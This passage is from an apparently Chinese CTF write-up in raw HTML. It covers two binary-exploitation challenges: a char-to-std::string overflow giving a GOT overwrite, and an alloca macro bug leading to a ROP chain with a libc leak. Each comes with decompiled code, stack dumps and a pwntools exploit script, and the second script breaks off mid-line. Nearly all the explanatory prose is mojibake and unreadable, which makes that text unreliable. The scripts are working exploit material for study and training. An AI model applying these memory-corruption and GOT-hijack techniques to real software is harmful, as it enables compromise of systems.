class=\"line\">LABEL_13:</span><br><span class=\"line\">          v18 = <span class=\"built_in\">std</span>::operator&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">&quot;bye!&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v18, &amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;);</span><br><span class=\"line\">          v19 = <span class=\"number\">0</span>;</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_15;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v19 = <span class=\"number\">1</span>;</span><br><span class=\"line\">LABEL_15:</span><br><span class=\"line\">  Test::~Test((Test *)test);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v19;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¾“å…¥ 0x1f ä¸ª A åˆ° char é‡Œå’Œ 0x8 ä¸ªåˆ° string é‡Œ<br>\nå¯ä»¥çœ‹åˆ°</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x007fff9d71f280</span>â”‚+<span class=\"number\">0x0000</span>: <span class=\"string\">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f288</span>â”‚+<span class=\"number\">0x0008</span>: <span class=\"string\">&quot;AAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f290</span>â”‚+<span class=\"number\">0x0010</span>: <span class=\"string\">&quot;AAAAAAAAAAAAAAA&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f298</span>â”‚+<span class=\"number\">0x0018</span>: <span class=\"number\">0x41414141414141</span> (<span class=\"string\">&quot;AAAAAAA&quot;</span>?)</span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f2a0</span>â”‚+<span class=\"number\">0x0020</span>: <span class=\"number\">0x007fff9d71f2b0</span>  â†’  <span class=\"string\">&quot;BBBBBBBB&quot;</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f2a8</span>â”‚+<span class=\"number\">0x0028</span>: <span class=\"number\">0x0000000000000008</span></span><br><span class=\"line\"><span class=\"number\">0x007fff9d71f2b0</span>â”‚+<span class=\"number\">0x0030</span>: <span class=\"string\">&quot;BBBBBBBB&quot;</span></span><br></pre></td></tr></table></figure>\n<p>string ç¬¬ä¸€ä¸ªæ˜¯æŒ‡é’ˆ æŒ‡å‘å †ä¸Š<br>\næˆ‘ä»¬å¯ä»¥åŠ«æŒè¿™ä¸ªæŒ‡é’ˆæ¥è¿›è¡Œä»»æ„å†™ å…·ä½“åŸå› å¦‚ä¸‹</p>\n<blockquote>\n<p><code>string</code>  ã¯ã€Œæ–‡å­—åˆ—ã‚’æ ¼ç´ã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ (8bytes), é•·ã• (8bytes), æ–‡å­—åˆ— (çŸ­ã‘ã‚Œã°ã“ã“ã«ã€é•·ã‘ã‚Œã° heap ä¸Šã«)ã€<br>\nã¨ã„ã†æ§‹é€ ã‚’ã—ã¦ã„ã¾ã™ã€‚ãªã®ã§ã€Œæ–‡å­—åˆ—ã‚’æ ¼ç´ã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã€ã‚’  <code>test.c_str()</code>  ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã§<br>\næ›¸ãæ›ãˆã‚Œã° GOT ã«ä»»æ„æ›¸ãè¾¼ã¿ãŒã§ãã¾ã™ã€‚ã“ã‚Œã§  <code>call_me</code>  ã‚’å‘¼ã¹ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚</p>\n</blockquote>\n<p>è‡³äºæœ€åä¸€ä¸ªéš¾é¢˜å°±æ˜¯é€‰æ‹© got è¡¨äº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x404018</span> &lt;_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_@got.plt&gt;: <span class=\"number\">0x0000000000401030</span>      <span class=\"number\">0x00007ffff7ee5d70</span></span><br><span class=\"line\"><span class=\"number\">0x404028</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@got.plt&gt;:   <span class=\"number\">0x0000000000401050</span>      <span class=\"number\">0x0000000000401060</span></span><br><span class=\"line\"><span class=\"number\">0x404038</span> &lt;__cxa_atexit@got.plt&gt;:        <span class=\"number\">0x00007ffff7c07de0</span>      <span class=\"number\">0x0000000000401080</span></span><br><span class=\"line\"><span class=\"number\">0x404048</span> &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt&gt;:     <span class=\"number\">0x00007ffff7f01bb0</span>      <span class=\"number\">0x00007ffff7f006d0</span></span><br><span class=\"line\"><span class=\"number\">0x404058</span> &lt;__stack_chk_fail@got.plt&gt;:    <span class=\"number\">0x00000000004010b0</span>      <span class=\"number\">0x00000000004010c0</span></span><br><span class=\"line\"><span class=\"number\">0x404068</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev@got.plt&gt;:   <span class=\"number\">0x00007ffff7f114b0</span>      <span class=\"number\">0x00007ffff7c4cad0</span></span><br><span class=\"line\"><span class=\"number\">0x404078</span> &lt;_ZNSt8ios_base4InitC1Ev@got.plt&gt;:     <span class=\"number\">0x00007ffff7e890f0</span>      <span class=\"number\">0x00007ffff7ee2bb0</span></span><br><span class=\"line\"><span class=\"number\">0x404088</span> &lt;_Unwind_Resume@got.plt&gt;:      <span class=\"number\">0x0000000000401110</span>      <span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p>ä¸ªäººæœ€å¼€å§‹æ˜¯å†™ <code>__stack_chk_fail</code>  çš„ ç„¶åæƒ³ç€ç”¨ pwntools çš„ shutdown<br>\n ä½†æ˜¯ææ„çš„æ—¶å€™ä¼š free æ‰ string å¯¼è‡´ç³»ç»Ÿæå‰å´©<br>\næ‰€ä»¥æŒ‰ wp å°±æ˜¯æ”¹ <code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</code>  äº†<br>\nå…·ä½“å¯èƒ½æ˜¯è¯•ä¸€ä¸ªä¸ªå‡ºæ¥çš„</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\">context(os=<span class=\"string\">&quot;Linux&quot;</span>,arch=<span class=\"string\">&quot;amd64&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./chall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span>                    :p.recvline()</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims             :p.recvuntil(delims)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">info    = <span class=\"keyword\">lambda</span> tag, addr          :p.info(<span class=\"string\">&#x27;======&gt;&#x27;</span>+tag + <span class=\"string\">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(addr))</span><br><span class=\"line\">ir      = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">ri      = <span class=\"keyword\">lambda</span>                    :raw_input()</span><br><span class=\"line\">ps      = <span class=\"keyword\">lambda</span>                    :pause()</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">struct Test &#123;</span></span><br><span class=\"line\"><span class=\"string\">\tchar _c_str[0x20];</span></span><br><span class=\"line\"><span class=\"string\">\tstd::string _str;</span></span><br><span class=\"line\"><span class=\"string\">&#125;;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_c_str</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;c_str: &quot;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_c_str</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_str</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;str: &quot;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_str</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;choice: &quot;</span>, <span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># b *0x4013E6</span></span><br><span class=\"line\">got = <span class=\"number\">0x404048</span> <span class=\"comment\"># _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x4016DE</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\tset_c_str(<span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">0x20</span> + p64(got))</span><br><span class=\"line\">\tset_str(p64(binsh))</span><br><span class=\"line\">\tir()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<h1 id=\"smal_arey\"><a class=\"markdownIt-Anchor\" href=\"#smal_arey\">#</a> smal_arey</h1>\n<p>åªå¼€äº† NX</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_SIZE(n) (n * sizeof(long))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">long</span> size, index, *arr;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%ld&quot;</span>, &amp;size) != <span class=\"number\">1</span> || size &lt; <span class=\"number\">0</span> || size &gt; <span class=\"number\">5</span>)<span class=\"comment\">// 1 2 3 4</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  arr = ARRAY_NEW(size);                   [<span class=\"number\">1</span>] &lt;&lt;- åœ¨æ ˆä¸Šç”³è¯· n + <span class=\"number\">1</span> ä¸ªsize</span><br><span class=\"line\">  <span class=\"title function_\">while</span> <span class=\"params\">(<span class=\"number\">1</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: &quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%ld&quot;</span>, &amp;index) != <span class=\"number\">1</span> || index &lt; <span class=\"number\">0</span> || index &gt;= size)</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;value: &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%ld&quot;</span>, &amp;arr[index]);             [<span class=\"number\">2</span>] &lt;&lt;- åœ¨sizeèŒƒå›´å†…è¿›è¡Œä»»æ„å››å­—èŠ‚çš„è¯»å†™</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__attribute__((constructor))</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">setup</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\">  alarm(<span class=\"number\">180</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>alloca</code>  æ˜¯åœ¨æ ˆä¸Šåˆ†é…å†…å­˜ å¹¶è‡ªåŠ¨é‡Šæ”¾<br>\nå…¶å®å°±ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æ ˆä¸Š ç„¶å rsp å‡ä¸‹å»ç½¢äº†<br>\nå®çš„åˆ†é…é—®é¢˜</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_SIZE(n) (n * sizeof(long))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))</span></span><br><span class=\"line\"></span><br><span class=\"line\">=&gt; alloca(n + <span class=\"number\">1</span> * <span class=\"keyword\">sizeof</span>(<span class=\"type\">long</span>))</span><br></pre></td></tr></table></figure>\n<p>ç„¶å <code>size</code>  å¦‚æœèƒ½è¢«è¦†ç›–çš„è¯ idx å°±èƒ½è¶Šç•Œäº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> *v4; <span class=\"comment\">// rsp</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 size; <span class=\"comment\">// [rsp+8h] [rbp-20h] BYREF</span></span><br></pre></td></tr></table></figure>\n<p>è¿™ä¸ª alloca å…¶å®å°±æ˜¯å‡å» rsp ç„¶åå¾€æ ˆé¡¶å­˜æ”¾</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>â”‚ rsp <span class=\"number\">0x7ffd12538830</span> â€”â–¸ <span class=\"number\">0x4013e3</span> (__libc_csu_init+<span class=\"number\">99</span>) â—‚â€” pop    rdi</span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>â”‚     <span class=\"number\">0x7ffd12538838</span> â€”â–¸ <span class=\"number\">0x404020</span> (<span class=\"built_in\">printf</span>@got.plt) â€”â–¸ <span class=\"number\">0x7f2a5fcc3c90</span> (<span class=\"built_in\">printf</span>) â—‚â€” endbr64</span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>â”‚     <span class=\"number\">0x7ffd12538840</span> â€”â–¸ <span class=\"number\">0x401094</span> (<span class=\"built_in\">printf</span>@plt+<span class=\"number\">4</span>) â—‚â€” bnd jmp qword ptr [rip + <span class=\"number\">0x2f85</span>]</span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>â”‚     <span class=\"number\">0x7ffd12538848</span> â€”â–¸ <span class=\"number\">0x4010d0</span> (_start) â—‚â€” endbr64</span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>â”‚     <span class=\"number\">0x7ffd12538850</span> â—‚â€” <span class=\"number\">0x7fffffffffffffff</span>            [<span class=\"number\">1</span>] &lt;- size</span><br></pre></td></tr></table></figure>\n<p><code>%ld</code>  çš„æœ€å¤§å†™å…¥ä¸º <code>0x7fffffffffffffff</code> <br>\n å¯ä»¥è¦†ç›–æ‰ size å’Œ arr è¾¾åˆ° got è¡¨ä»»æ„å†™çš„æ•ˆæœ å¯ä»¥é€šè¿‡ä¸åˆæ³•çš„å€¼è§¦å‘ exit</p>\n<p>å†çœ‹çœ‹è¿”å›åœ°å€<br>\nå¦‚æœåœ¨æ ˆä¸­è§¦å‘ exit çš„ got ä¼šå‹å…¥è¿”å›åœ°å€<br>\nåªéœ€è¦è®© rsp+8 å°±èƒ½æ‰§è¡Œ ROP äº† ä¹Ÿå°±æ˜¯å†™ä¸ª pop ret</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rsp <span class=\"number\">0x7ffd12538830</span> â€”â–¸ <span class=\"number\">0x4013e3</span> (__libc_csu_init+<span class=\"number\">99</span>) â—‚â€” pop    rdi</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538838</span> â€”â–¸ <span class=\"number\">0x404020</span> (<span class=\"built_in\">printf</span>@got.plt) â€”â–¸ <span class=\"number\">0x7f2a5fcc3c90</span> (<span class=\"built_in\">printf</span>) â—‚â€” endbr64</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538840</span> â€”â–¸ <span class=\"number\">0x401094</span> (<span class=\"built_in\">printf</span>@plt+<span class=\"number\">4</span>) â—‚â€” bnd jmp qword ptr [rip + <span class=\"number\">0x2f85</span>]</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538848</span> â€”â–¸ <span class=\"number\">0x4010d0</span> (_start) â—‚â€” endbr64</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538850</span> â—‚â€” <span class=\"number\">0x7fffffffffffffff</span>                                         [<span class=\"number\">2</span>] &lt;- size</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538858</span> â—‚â€” <span class=\"number\">0x4</span></span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538860</span> â€”â–¸ <span class=\"number\">0x7ffd12538830</span> â€”â–¸ <span class=\"number\">0x4013e3</span> (__libc_csu_init+<span class=\"number\">99</span>) â—‚â€” pop rdi [<span class=\"number\">1</span>] &lt;- arr</span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538868</span> â—‚â€” <span class=\"number\">0x2abd7f93dc67a400</span></span><br><span class=\"line\">rbp <span class=\"number\">0x7ffd12538870</span> â—‚â€” <span class=\"number\">0x0</span></span><br><span class=\"line\">    <span class=\"number\">0x7ffd12538878</span> â€”â–¸ <span class=\"number\">0x7f2a5fc86083</span> (__libc_start_main+<span class=\"number\">243</span>) â—‚â€” mov    edi, eax</span><br></pre></td></tr></table></figure>\n<p>æ€»æµç¨‹å¦‚ä¸‹</p>\n<ul>\n<li>é€šè¿‡ alloca çš„æŒ‡é’ˆåœ¨ rsp æ ˆé¡¶å¸ƒç½®æˆ‘ä»¬çš„ rop å¹¶åŠ«æŒ size åç¯¡æ”¹ alloca å‡ºæ¥çš„æŒ‡é’ˆ è¾¾åˆ° got ä»»æ„å†™çš„æ•ˆæœ</li>\n<li>è¿›å…¥ exit çš„ got çš„æ—¶å€™ ä¼šå‹å…¥è¿”å›åœ°å€ æ‰§è¡Œ rop çš„æ—¶å€™è¦ pop æ‰è¿™ä¸ª</li>\n<li>ROP ç”¨ç»å…¸ plt æ³„æ¼ got çš„å¥—è·¯ å¹¶è¿”å› main</li>\n<li>é‡å¤ä¸Šè¿°</li>\n</ul>\n<h2 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\">context(os=<span class=\"string\">&quot;Linux&quot;</span>,arch=<span class=\"string\">&quot;amd64&quot;</span>,log_level=<span class=\"string\">&quot;debug&quot;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./chall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span>                    :p.recvline()</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims             :p.recvuntil(delims)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">info    = <span class=\"keyword\">lambda</span> tag, addr          :p.info(<span class=\"string\">&#x27;======&gt;&#x27;</span>+tag + <span class=\"string\">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(addr))</span><br><span class=\"line\">ir      = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">ri      = <span class=\"keyword\">lambda</span>                    :raw_input()</span><br><span class=\"line\">ps      = <span class=\"keyword\">lambda</span>                    :pause()</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc-2.31.so&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./chall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set</span>(<span class=\"params\">idx, val</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;index: &quot;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;value: &quot;</span>, <span class=\"built_in\">str</span>(val))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\tsla(<span class=\"string\">&quot;size:&quot;</span>, <span class=\"string\">&quot;5&quot;</span>)<span class=\"comment\"># 0 - 5</span></span><br><span class=\"line\">\tpop_rdi = <span class=\"number\">0x4013e3</span></span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">0</span>, pop_rdi)</span><br><span class=\"line\">\t<span class=\"built_in\">set</span>(<span class=\"number\">1</span> 